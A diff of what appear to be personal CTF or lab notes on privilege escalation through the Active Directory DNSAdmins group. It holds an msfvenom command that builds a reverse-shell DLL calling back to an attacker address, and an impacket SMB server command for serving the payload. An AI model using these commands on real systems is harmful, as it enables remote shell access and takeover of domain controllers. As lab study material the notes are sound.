@@ -66,9 +66,9 @@ https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-
 
 Reverse DLL
 ```
-msfvenom -p windows/x64/shell_reverse_tcp -f dll -o rev.dll LHOST=10.10.16.20 LPORT=9999
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=9001 -f dll > rev.dll
 ```
-![[Pasted image 20240506081507.png]]
+![[Pasted image 20240507011836.png]]
 
 We have to use LOLbins
 https://lolbas-project.github.io/
@@ -76,3 +76,10 @@ https://lolbas-project.github.io/
 ![[Pasted image 20240506081837.png]]
 
 I think we have to host the fill remotely or i am doing something
+```
+impacket-smbserver Toolkit $(pwd)
+```
+
+```
+
+```
